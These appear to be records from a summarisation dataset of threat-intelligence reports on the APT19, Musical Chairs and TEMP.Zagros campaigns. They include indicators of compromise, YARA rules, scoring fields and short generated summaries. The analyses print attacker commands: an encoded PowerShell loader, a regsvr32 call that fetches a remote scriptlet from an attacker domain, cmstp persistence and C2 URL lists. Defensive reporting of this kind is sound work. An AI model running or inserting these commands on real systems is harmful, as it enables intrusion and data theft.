(NBI)lyncdiscover.2bunny[.]comautodiscover.2bunny[.]comlyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/lyncdiscover.2bunny[.]com/Autodiscoverautodiscover.2bunny[.]com/K5omsfo02s01-in-f2.cloudsend[.]net/submit.phpsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmltk-in-f156.2bunny[.]comtk-in-f156.2bunny[.]com/Agreement.doc104.236.77[.]169138.68.45[.]9162.243.143[.]145Mozilla/5.0 (compatible, MSIE 9.0, Windows NT 6.1, Trident/5.0, FunWebProducts, IE0006_ver1,EN_GB)tf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)Host Based Indicators (HBI)RTF MD5 hash values0bef39d0e10b1edfe77617f494d733a80e6da59f10e1c4685bb5b35a30fc8fb6cebd0e9e05749665d893e78c452607e2XLSX MD5 hash values38125a991efc6ab02f7134db0ebe21b63a1dca21bfe72368f2dd46eb4d9b48c430f149479c02b741e897cdb9ecd22da7BEACON and Meterpreter payload MD5 hash valuesbae0b39197a1ac9e24bdf9a9483b18ea1151619d06a461456b310096db6bc548Process arguments, named pipes, and file pathspowershell.exe -NoP -NonI -W Hidden -Command ""Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(""<base64 blob>"")regsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscover scrobj.dll\\<ip>\pipe\msagent_<4 digits>C:\Documents and Settings\<user>\Local Settings\Temp\K5om.dll (4 character DLL based on URI of original GET request)Yara Rulesrule FE_LEGALSTRIKE_MACRO {meta:version="".1""filetype=""MACRO""author=""Ian.Ahl@fireeye.com @TekDefense""date=""2017-06-02""description=""This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7.""strings:// OBSFUCATION$ob1 = ""ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)"" ascii wide$ob2 = ""ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)"" ascii wide$ob3 = ""ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)"" ascii wide$ob4 = ""ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)"" ascii wide$ob5 = ""ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)"" ascii wide$ob6 = ""ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)"" ascii wide$ob7 = ""ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)"" ascii wide$ob8 = ""ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)"" ascii wide$obreg1 = /(\w{5}\s&\s){7}\w{5}/$obreg2 = /(Chrw\(\d{1,3}\)\s&\s){7}/// wscript$wsobj1 = ""Set Obj = CreateObject(\""WScript.Shell\"")"" ascii wide$wsobj2 = ""Obj.Run "" ascii wide condition:(((uint16(0) != 0x5A4D))and(all of ($wsobj*) and 3 of ($ob*)orall of ($wsobj*) and all of ($obreg*)))}rule FE_LEGALSTRIKE_MACRO_2 {meta:version="".1""filetype=""MACRO""author=""Ian.Ahl@fireeye.com @TekDefense""date=""2017-06-02""description=""This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4.""strings:// Setting the environment$env1 = ""Arch = Environ(\""PROCESSOR_ARCHITECTURE\"")"" ascii wide$env2 = ""windir = Environ(\""windir\"")"" ascii wide$env3 = ""windir + \""\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"""" ascii wide// powershell command fragments$ps1 = ""-NoP"" ascii wide$ps2 = ""-NonI"" ascii wide$ps3 = ""-W Hidden"" ascii wide$ps4 = ""-Command"" ascii wide$ps5 = ""New-Object IO.StreamReader"" ascii wide$ps6 = ""IO.Compression.DeflateStream"" ascii wide$ps7 = ""IO.MemoryStream"" ascii wide$ps8 = "",$([Convert]::FromBase64String"" ascii wide$ps9 = ""ReadToEnd(),"" ascii wide$psregex1 = /\W\w+\s+\s\"".+\""/condition:(((uint16(0) != 0x5A4D))and(all of ($env*) and 6 of ($ps*)orall of ($env*) and 4 of ($ps*) and all of ($psregex*)))}rule FE_LEGALSTRIKE_RTF {meta:version="".1""filetype=""MACRO""author=""joshua.kim@FireEye.com""date=""2017-06-02""description=""Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom"" strings:$header = ""{\\rt"" $lnkinfo = ""4c0069006e006b0049006e0066006f"" $encoded1 = ""4f4c45324c696e6b""$encoded2 = ""52006f006f007400200045006e007400720079""$encoded3 = ""4f0062006a0049006e0066006f""$encoded4 = ""4f006c0065"" $http1 = ""68{""$http2 = ""74{""$http3 = ""07{"" // 2bunny.com$domain1 = ""32{\\""$domain2 = ""62{\\""$domain3 = ""75{\\""$domain4 = ""6e{\\""$domain5 = ""79{\\""$domain6 = ""2e{\\""$domain7 = ""63{\\""$domain8 = ""6f{\\""$domain9 = ""6d{\\"" $datastore = ""\\*\\datastore"" condition:$header at 0 and all of them}AcknowledgementsJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco, Christopher Glyer";"FireEye has observed a phishing campaign targeting at least seven global law and investment firms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government. APT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 20170199. Toward the end of May, APT19 switched to using macroenabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload. As of the writing of this blog post, FireEye had not observed postexploitation activity by the threat actors, so we cannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment firms for competitive economic purposes. This purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection. The Emails APT19 phishing emails from this campaign originated from sender email accounts from the ""@cloudsend[. ]net"" domain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for more details. The Attachments APT19 leveraged Rich Text Format (RTF) and macroenabled Microsoft Excel (XLSM) files to deliver their initial exploits. The following sections describe the two methods in further detail. RTF Attachments Through the exploitation of the HTA handler vulnerability described in CVE";en;{'r': 0.1896551724137931, 'p': 0.9625, 'f': 0.31687242523328085};{'r': 0.16678966789667896, 'p': 0.9338842975206612, 'f': 0.2830306799583126};{'r': 0.1896551724137931, 'p': 0.9625, 'f': 0.31687242523328085}
https://www.netscout.com/blog/asert/musical-chairs-playing-tetris;Musical Chairs Playing Tetris;"February 20, 2018: This blog has been amended since it was originally published on February 15, 2018. This version removes the association with the APT group responsible for the Night Dragon campaign that we had incorrectly made. We thank the research team at Palo Alto Networks for graciously bringing this to our attention.IntroductionASERT has discovered new command-and-control infrastructure controlled by the actors behind the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them long after they have been identified, and for making use of a popular opened sourced RAT called Gh0st. Uniquely in our observation, they have even embedded a fully-functional version of the game Tetris that will launch only when a special condition is meet.Key FindingsASERT has discovered a new domain associated with the actors behind the Musical Chairs campaign.This long-standing actor is known for maintaining static command-and-control infrastructure such as domains for long periods of time, even when they have been discovered and widely publicized in the community.With moderate confidence, ASERT expects this domain to be used in new intrusions.Multiplearticles have been written about Gh0st over the years, including this one discussing the Musical Chairs campaign's use of this RAT. Using details from that report, ASERT has identified a new sample and more interestingly, a new domain that we have associated with the corresponding actor. The sample appears to be delivered via an email according to artifacts provided by malware-traffic-analysis, which is consistent with documented tactics for this group.Gh0st variants are prolific as they can be found in a popular open-source source code repository - this blog provides the basis for our association with the actor.AnalysisMalwareExample of this Gh0st's init/login packet (notice 'aaaaabbbbb' which can be used to identify this variant):Some other behavior of interest observed while reviewing this actor's specimen is they appear to be moving away from BAT and JS files as part of the infection process[i] to using DLL side loading. This is just one sample though, so take this for what it is. As part of the DLL side-loading, they make use of a signed executable to load a DLL which in turn is used to launch the actual Gh0st DLL. They are not the only malware authors who use this trick.The observed functionality in this sample maps directly to public documentation for Gh0st, so this blog will not rehash that.Association No. 1Starting with the known C2 servers for this group, we can check to see if the new domain has any ties to them. Two of their C2s were registered back in 2013 and the campaign has been around even longer than that perKnown Domainsyourbroiler[.]commeitanjiaoyiwang[.]comNew Domainetybh[.]comLooking at DomainTools, we learn that all three share the same IP, 45.34.148.126, and the same registrar, Jiangsu Bangning Science & Technology Co. LTD. The newest domain, etybh[.]com, was registered in December of 2017. Looking at PassiveTotal, all three domains appeared to have switched from 98.126.223.218 to 45.34.148.146 sometime in the middle of January 2018. This is our first clue that they are related.Association No. 2This one comes from looking at behavior when the file is attached to a debugger.First, let us back up a step. Observing behaviors of our suspected Musical Chairs Gh0st sample via a sandbox, we see that it creates a folder called ""Win32Tetris"". Let's see if there are any other Gh0st samples that do this as well. Taking a look through ASERT's malware corpus we find this sample, 11fe12bbb479b4562c1f21a74e09b233ed41c41b7c4c0cad73692ff4672fb86a, which also creates that folder. Using clues left by another researcher[ii], we can confirm that this more recent sample is from the Musical Chairs group due to the C2 and some other characteristics we'll go over. The most promising correlation is that this sample's C2 is www.yourbroiler[.]com which is a known C2 for this actor. Next, we find similarities from a different dropped file called C:\microsoft\lib\ki\vv.js whose content reads as such:The content is similar to samples identified back in 2015[iii], which also used rundll32 to call a mystart method. And, finally, this sample makes use of the same mutex tied to this actor's Gh0st variant: dafewewrw. To summarize the pivot sampleProperty Value Load the dll via a script file called C:\microsoft\lib\ki\vv.js Domain www.yourbroiler[.]com Mutex dafewewrwNow that we have confirmed that this sample appears to be a Musical Chairs actor Gh0st variant, let's work the pivot (going to refer to this sample as the ""pivot"" sample). The pivot sample, when attached to a debugger, will launch what appears to be a fully functional Tetris game (very friendly of them to provide us reverse engineers with a short break):The latest sample (the one tied to the new domain, etybh[.]com) also exhibits this same behavior when attached to the debugger. To play the game make sure to not hide the PEB. For what it is worth, after checking out one of the prior samples from 2015[iv], it exhibited similar behavior, just not a Tetris game.Association No. 3The final observation is the fact that the payload dropped on the file system as RasTls.dat is in fact an obfuscated DLL file. When looking at the DLL properties the mystart function is exported. Again, mystart is the exported DLL function which the samples back in 2015 called.ConclusionWhile it should not surprise us when a long-standing actor switches things up, this specific actor is known for not really changing much. The use of a different Gh0st variant in addition to the new domain may be indicative of additional changes coming or the actor may be just keeping up with the times. Given previously observed behavior, it is likely that this indicator will be used in the campaign for the foreseeable future and ASERT is making it available to enable visibility for the broader security research community.[i]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult...[ii]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult...[iii]https://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-mult...[iv] Hash: 50f08f0b23fe1123b298cb5158c1ad5a8244ce272ea463a1e4858d12719b337f";Yes, we have observed this behavior in other Gh0st samples as well. ### Instruction: Summarize the ITSecurity report This sample appears to be a Musical Chairs actor Gh0st variant.;en;{'r': 0.04814004376367615, 'p': 0.7857142857142857, 'f': 0.0907216483965565};{'r': 0.015116279069767442, 'p': 0.4642857142857143, 'f': 0.029279278668533415};{'r': 0.045951859956236324, 'p': 0.75, 'f': 0.08659793705635031}
https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign;Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign;"IntroductionFrom January 2018 to March 2018, through FireEye's Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East.We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017. This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia. The spear phishing emails and attached malicious macro documents typically have geopolitical themes. When successfully executed, the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution. The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system.Campaign TimelineIn this campaign, the threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1.Figure 1: Timeline of this recently observed spear phishing campaignThe first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macro-based document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2.Figure 2: Process chain for the first part of the campaignAlthough the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3.Figure 3: VBS invoking PowerShell via MSHTAThe second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog.Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment. One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4.Figure 4: Sample spear phishing email containing macro-based document attachmentThe malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India. What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog.Figure 5 shows a document purporting to be from the National Assembly of Pakistan.Figure 5: Document purporting to be from the National Assembly of PakistanA document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6.Figure 6: Document purporting to be from the Turkish Armed ForcesA document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7.Figure 7: Document purporting to be from the Institute for Development and Research in Banking TechnologyFigure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan.Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of TajikistanEach of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server.Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018. The threat group in this recently observed campaign - TEMP.Zagros - weaponized their malware using the following techniques.The macro in the Word document drops three files in a hard coded path: C:\programdata. Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above. The following are the three files:Defender.sct - The malicious JavaScript based scriptlet file.- The malicious JavaScript based scriptlet file. DefenderService.inf - The INF file that is used to invoke the above scriptlet file.- The INF file that is used to invoke the above scriptlet file. WindowsDefender.ini - The Base64 encoded and obfuscated PowerShell script.After dropping the three files, the macro will set the following registry key to achieve persistence:\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersion\Run\""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.infUpon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. This is possible because inside the INF file we have the following section:[UnRegisterOCXSection]%11%\scrobj.dll,NI,c:/programdata/Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9.Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products. FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique.SCT File AnalysisThe code of the Defender.sct file is an obfuscated JavaScript. The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line:powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script.PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools.Some of the key obfuscation techniques used are:Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult.Figure 10: Character replacement and string reversing techniquesPowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. Some of the instances used in this script are: XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11.Figure 11: PowerShell script is XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script, we can divide it into three sections.Section 1The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:TEMpPAtH = ""C:\ProgramData\"" (the path used for storing the temp files)Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine)FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code)PRIVAtE = Private Key exponentsPUbLIc = Public Key exponentsHklm = ""HKLM:\Software\""Hkcu = ""HKCU:\Software\""ValuE = ""kaspersky""SYSIDDrAGon_MidDLe = [array of proxy URLs]Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12.Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server. The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script.Section 3The third section of the PowerShell script is the biggest section and has a wide variety of functionalities.During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:The English translation for this message is: ""Cannot connect to website, please wait for dragon"".Other functionalities provided by this section of the PowerShell Script are as follows:Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure 13.Figure 13: Concatenated and formatted data retrieved by PowerShell scriptRegister the victim's machine to the C2 server by sending the REGISTER command to the server. In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim's machine and the C2 server.While sending to the C2 server, the data is formatted as follows:@{SYSINFO = $get.ToString(), ACTION = ""REGISTER"",}Ability to take screenshots.Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14.Figure 14: System shut down upon discovery of security toolsAbility to receive PowerShell script from the C2 server and execute on the machine. Several techniques are employed for executing the PowerShell code: If command starts with ""excel"", then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:If the command starts with ""outlook"", then it leverages Outlook.Application and MSHTA to execute the code:If the command starts with ""risk"", then execution is performed through DCOM object:File upload functionality.Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure 15: Disabling Microsoft Office Protected ViewAbility to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16.Figure 16: Reboot, shut down and clean commandsAbility to sleep for a given number of seconds.The following table summarizes the main C2 commands supported by this PowerShell Script.C2 Command Purpose reboot Reboot the system using shutdown command shutdown Shut down the system using shutdown command clean Wipe the Drives, C:\, D:\, E:\, F:\ screenshot Take a screenshot of the System upload Encrypt and upload the information from the system excel Leverage Excel.Application COM object for code execution outlook Leverage Outlook.Application COM object for code execution risk Leverage DCOM object for code executionConclusionThis activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware. By combining multiple layers of obfuscation, they deter the process of reverse engineering and also attempt to evade security products.Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.Indicators of CompromiseMacro based Documents and HashesSHA256 Hash Filename Targeted Region eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 na.doc Pakistan 76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 Invest in Turkey.doc Turkey 6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac guvenlik yonergesi. .doc Turkey 009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 idrbt.doc India 18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 Turkiye Cumhuriyeti Kimlik Kart?.doc Turkey 3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb Turkish Armed Forces.doc Turkey 9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c na.gov.pk.doc Pakistan 3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 MVD-FORM-1800.doc Tajikistan cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 KEGM-CyberAttack.doc Turkey 1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 IL-1801.doc Turkey aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 kiyiemniyeti.doc Turkey 93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 TCELL-S1-M.doc Tajikistan c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9 egm-1.doc Turkey 2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 Connectel .pk.doc Pakistan 18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd gAYvenlik_yAoenergesi_.doc Turkey 153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 MIT.doc Turkey d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 Gvenlik Ynergesi.doc Turkey af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 Gvenlik Ynergesi.doc Turkey 5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af NA Turkey 3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c Anadolu GA 1/4neydoAYu Projesinde .doc TurkeyNetwork IndicatorsList of Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy-home-sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com/admin/db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com/wp-includes/db_template.phphxxps://anbinni.ba/wp-admin/db_template.phphxxp://arctistrade[.]de/wp/db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za/oldweb/db_template.phphxxp://chrisdejager-attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phphxxp://agencereferencement.be/wp-admin/db_template.phphxxp://americanlegacies[.]org/webthed_ftw/db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk/category/db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex-frost[.]com/assets/db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za/contents/db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phphxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best-digital-slr-cameras[.]com//db_template.phphxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com/wp-admin/db_template.phphxxp://ar-rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp://alexanderbecker[.]net/services/db_template.phphxxp://visionclinic.co.ls/visionclinic/db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phphxxps://www.dopetroleum[.]com//db_template.phphxxp://bios-chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba-africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za/js/db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com/wp-admin/db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info/tpl/db_template.phphxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero-resource-center[.]org/administrator/db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za/wpscripts/db_template.phphxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com/font-awesome/fonts/db_template.phphxxps://amooy[.]com/webservice/db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za/catalog/db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com/wp-includes/db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net/host24new/db_template.phphxxp://www.altaica[.]ca/wordpress/db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za/js/db_template.phphxxp://clientcare.co.ls//db_template.phphxxp://investaholdings[.]co.za/htc/db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com/store/db_template.phphxxp://findinfo-more[.]com//db_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com/includes/db_template.phphxxp://arbruisseau[.]com/profiles/db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all-reseller[.]com/zzz_backup/db_template.phphxxp://alcatrazmoon[.]com/images/db_template.phphxxp://www.alcalumni[.]com/wp-includes/db_template.phphxxp://aniljoseph[.]com/servermon/db_template.phphxxp://alwake3press[.]com/wp-includes/db_template.phphxxp://www.hfhl[.]org.ls/habitat/db_template.phphxxp://alcafricanos[.]com/slsmonographs/db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org/en/db_template.phphxxps://ancient-wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk/font-awesome/db_template.phphxxp://geetransfers[.]co.za/font-awesome/db_template.phphxxp://carlagrobler[.]co.za/components/db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za/video/db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz/kitzz/db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za/nweb2/db_template.phphxxp://chrishanicdc[.]org/wpimages/db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia-equ